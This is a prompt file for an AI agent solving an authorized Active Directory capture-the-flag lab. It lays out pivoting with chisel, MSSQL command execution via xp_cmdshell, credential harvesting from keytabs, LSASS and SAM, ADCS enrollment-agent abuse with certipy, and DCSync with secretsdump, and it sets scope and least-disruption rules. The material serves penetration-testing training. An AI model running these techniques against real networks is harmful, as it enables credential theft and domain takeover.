# Perfect prompt — BiotechCorp CTF, from zero

Paste the block below as the **first message** of a fresh run. It contains only what you
legitimately have at t=0 (three IPs, one account, your attack platform) plus the operating
discipline learned from doing it the slow way. No hashes, no discovered accounts, no chain.

---

You are solving an authorized Active Directory CTF. Work autonomously; I am not available for
questions. Every conclusion you report must be backed by a command you actually ran and its output.

## Starting position — this is ALL you know

- Initial account: `e.ross : SilverCometGlass@71` (domain `biotechcorp.offsec`) 
- Hosts, in the only order they can be reached:
  1. `192.168.197.180` — first network, reachable directly over the VPN - @<host1-ip> 
  2. `172.16.197.200` — second network, only reachable through host 1 - @<host2-ip> 
  3. `172.16.197.202` — second network, only reachable through host 1 - @<host3-ip>
- You do **not** know: any other credential, any hash, whether ADCS is installed, the domain
  admin account, or where the flags are. Discover all of it. Do not invent it.

## Objective (definition of done)

1. Administrative access on all three hosts.
2. Read `proof.txt` from the flags' location on each host (check `C:\Users\Administrator\Desktop\`
   and equivalents — search if it is not there).
3. Print the three flag values verbatim, each with the command that produced it.
4. Report the full path with the exact command per hop, plus every credential you recovered.

## Scope — hard limit

Only the three IPs above. No subnet sweeps, no host discovery outside them, no scanning the VPN
gateway or neighbouring ranges. If a tool wants to enumerate more, constrain it.

## Environment

Your tools run on Kali (`ssh kali '<cmd>'` from your local machine. VPN is up; the first host is routed
directly. To reach the second network, tunnel through host 1:

```
# on Kali
./chisel server -p 8081 --socks5 &
# on host 1 (via your RCE)
./chisel client <kali_tun0_ip>:8081 socks
# verify, then prefix every second-network tool
proxychains4 -q nxc smb '@<host2-ip> 
```

Add the DC to `/etc/hosts` on Kali as soon as you learn its FQDN — Kerberos needs the name.

---

## OPERATING RULES (these matter more than any tool)

**R1 — Calibrate Kerberos key derivation before you need it.**
Derive AES keys from the one plaintext credential you hold, across a few encodings and salts
(`impacket`'s `_AES256CTS.string_to_key`), confirm the winning convention with a single TGT
request, then reuse it forever. `PREAUTH_FAILED` means the derivation is wrong, **not** the
credential — never re-guess an encoding.

**R2 — Enumerate permissions before attempting authentication.**
The first action against AD is a permission sweep, not password guessing:
`bloodyad -k --host <dc> -d <domain> get writable`, plus full `certipy-ad find`
(all templates, not just `-vulnerable`). A template can be exploitable through *enrollment rights*
while `-vulnerable` reports nothing — always resolve who may enrol each template with a
Certificate Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`) and who is a Certificate Manager.

**R3 — Two-strike rule.**
If one technique fails twice, change technique, not parameters. Write the failure down and move on.
Never tune a dead end. Binary blobs (`msDS-ManagedPassword`, encrypted config) get **two** decode
attempts; if they resist, pivot to finding the plaintext elsewhere.

**R4 — Shell hygiene — this is where runs silently lose an hour.**
- Never paste quote-heavy or multi-line commands straight into a remote shell (WinRM, SSH, agent
  consoles). Write a script to a writable path, execute it there, then retrieve the output.
- Upload to a per-user writable directory (Windows: `C:/Users/<you>/Documents/`); shared spots
  like `Public` or temp are often ACL-denied to service accounts.
- For short one-liners prefer a single encoded command over hand-escaped quoting.

**R5 — Invocation defaults (avoids minutes of DNS and NETBIOS stalls).**
- Name the DC explicitly in every AD tool: `-dc-ip <ip>`, `-dc-host <fqdn>`, `-ns <ip>` where
  supported — never rely on auto-discovery.
- Kerberos tooling: export `KRB5CCNAME` and use a `krb5.conf` with `dns_canonicalize_hostname = false`,
  `rdns = false`, `udp_preference_limit = 1`.
- Certificate work: Kerberos auth (`-k -no-pass`) wherever NTLM is disabled; LDAPS only for any
  password write.
- Wrap flaky RPC-based requests in a 3-attempt loop — the first attempt routinely times out.

**R6 — Credential discipline.**
Record every credential with its source. Test each one **once** with a single auth to avoid lockout
policy. Never re-derive a key you already have. Reuse ccaches instead of re-authenticating.

**R7 — Least disruption.** Read flags, don't destroy. No mass password resets beyond the minimum
needed for the chain. Do not delete target files. Note anything you changed.

**R8 — Evidence over narrative.** Every hop gets: the exact command, the relevant output line, and a
one-sentence reason it worked. If a step's output did not prove the claim, say so.

---

## PHASES (time boxes are kill criteria — report and move on when hit)

**P0 — Confirm reachability (~5 min).**
`ip -br a | grep tun0`; `nmap -Pn -sT -sV -p 22,139,445,1433,3389,5985 '@<host1-ip> `.
Record open services. Deliverable: service table for host 1.

**P1 — Foothold on host 1 with the initial account (~20 min).**
1. `nxc smb <host1-ip> -u <user> -p '<pass>' --shares --groups` — confirm the credential, list
   shares and groups (adapt the protocol to what the credential is actually for).
2. Authenticate to the exposed service it targets — e.g. MSSQL:
   `impacket-mssqlclient <DOMAIN>/<user>:'<pass>'@<host1-ip> -windows-auth`.
3. Check privilege boundaries before exploiting: role membership, effective permissions,
   impersonation rights. In MSSQL: `IS_SRVROLEMEMBER('sysadmin')`,
   `fn_my_permissions(NULL,'SERVER')`, and `sys.server_permissions` where
   `permission_name='IMPERSONATE'`.
4. If not privileged: impersonation (`EXECUTE AS`), linked servers, then enable the
   command-execution feature (`xp_cmdshell` and equivalents). Command execution is the goal;
   the *route* varies.
5. On the box: `whoami /all`, local users, the local administrators group — then start P2.

**P2 — Harvest credentials on the foothold host (~25 min).** Look in this order, cheapest first:
- Shares you can read: `dir` every share, look for `*.keytab`, `*.kdbx`, `*.config`, `*.ps1`, `*.mof`, `*.xml`, `unattend*`, `*backup*`
- Keytabs: a keytab is a stored Kerberos credential — extract the key, no cracking needed
  (`from impacket.krb5.keytab import Keytab; Keytab(open(p,'rb').read())` — **bytes, not a path**)
- Plaintext in config: DSC MOFs and similar store UTF-16LE — search with
  `Select-String -Pattern 'Password|passwd|pwd' -Encoding Unicode`
- PowerShell history, service configs, IIS `web.config`, scheduled task XML with stored creds, installed-app config
- Local admin available? Then LSASS (`lsass.dmp` + pypykatz), SAM/SEC/SYSTEM.
Validate **each** new credential immediately with one auth attempt and note which host/service it works on.

**P3 — Pivot to the second network (~10 min).**
Start chisel through host 1. Verify: 
Deliverable: service table for both hosts. Identify the DC (88/389/636) and whether ADCS is present (CA on the DC).

**P4 — AD pathfinding (~25 min).** This is where the run is won or lost. Gather, then rank:
- If ADCS is present: `certipy-ad find -u <you> -k -no-pass -dc-ip ... -stdout` → CA name, every template, enrollment
  rights, manager-approval flags, EKUs, `Enrollee Supplies Subject`
- `bloodyad ... get writable` → every object you can modify, and with which right
- Full LDAP dump of users/groups: `memberOf`, `adminCount`, `servicePrincipalName`,
  `userAccountControl` (flag 514 = disabled — **record it, never target a disabled account with PKINIT**),
  `msDS-SupportedEncryptionTypes`, `msDS-GroupMSAMembership`, `description`/`info` (hints often hide there)
- Group membership of: Domain Admins, Certificate Managers, Remote Management Users, Backup Operators
- Machines you control → any ACE they hold → **two-hop ACL chains are the norm**

Rank candidate paths: (a) ACL edge to a principal that can enrol something (b) ADCS ESC chain
(c) gMSA you can read (d) delegation. Pick the shortest and pursue it end to end.

**P5 — Escalate to Domain Admin (~35 min).**
Follow the ranked path. Each hop must be verified with a TGT before you start the next
(`impacket-getTGT` success = hop confirmed). For ADCS enrollment-agent abuse the shape is:
enrol the agent template → request a client-auth template **on behalf of** a target → `certipy-ad auth`
→ ccache + NT hash. Target a **live, enabled** account (check UAC first — PKINIT against a
disabled account only returns `KDC_ERR_CLIENT_REVOKED`).
If a hop fails twice, fall back to the next ranked path — do not retry the same edge.

**P6 — Objectives (~10 min).** With DA:
- WinRM to each host: `evil-winrm -i <host> -r <realm> -K <da.ccache>`
- `Get-Content C:/Users/Administrator/Desktop/proof.txt`; if absent,
  `Get-ChildItem C:\ -Filter proof.txt -Recurse -Depth 6 -Force -ErrorAction SilentlyContinue`
- `impacket-secretsdump -k -no-pass -just-dc-ntlm` → record krbtgt + DA hashes + total entry count
- Report.

---

## DO NOT

Sweep other subnets · brute-force or password-spray (single attempt per credential) · retry a failed
key derivation · keep decoding a blob after two attempts · target a UAC-disabled account with PKINIT ·
run rockyou across a full DCSync dump (irrelevant to reaching the objective) · patch/delete target files ·
claim a step succeeded without its output.

## FINAL OUTPUT

1. Flag table: host | exact path | flag value | command used.
2. Chain table: step | command | why it worked (one line each).
3. Credential inventory: account | type (password/NT/AES) | value | where it came from.
4. Anything unverified or still open, stated plainly.
